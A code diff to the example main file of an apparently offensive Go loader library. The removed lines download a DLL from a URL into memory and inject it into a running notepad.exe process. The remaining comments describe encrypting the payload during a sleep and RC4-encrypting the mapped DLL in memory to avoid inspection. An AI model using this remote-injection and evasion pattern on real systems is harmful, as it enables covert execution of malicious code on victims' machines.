@@ -4,33 +4,12 @@ import (
 	"fmt"
 	"log"
 	"github.com/carved4/meltloader/pkg/pe"
-	"github.com/carved4/meltloader/pkg/net"
 	"runtime/debug"
 )
 
 func main() {
 	debug.SetGCPercent(-1)
 	log.Printf("[main] start")
-	pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
-	if err != nil {
-		log.Printf("[main] failed to find process: %v", err)
-		fmt.Println("failed to find process", err)
-		return
-	}
-	log.Printf("[main] target: pid=%d handle=0x%x", pid, pHandle)
-	buff, err := net.DownloadToMemory("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll")
-	if err != nil {
-		log.Printf("[main] failed to download DLL: %v", err)
-		fmt.Println("failed to download", err)
-		return
-	}
-	_, err = pe.LoadDLLRemote(pHandle, buff)
-	if err != nil {
-		log.Printf("[main] LoadDLLRemote failed: %v", err)
-		fmt.Println("failed to load", err)
-		return
-	}
-	log.Printf("[main] LoadDLLRemote succeeded")
 	// the downloaded buffer is optionally encrypted for an amount of time in seconds passed as an int to LoadDLLFromURL() as demonstrated in the call above and then decrypted before execution
 	// you can also call the func without the sleep parameter as displayed below
 	// the mapped DLL in memory after load and execution is encrypted in place with RC4 and will not be able to be interacted with
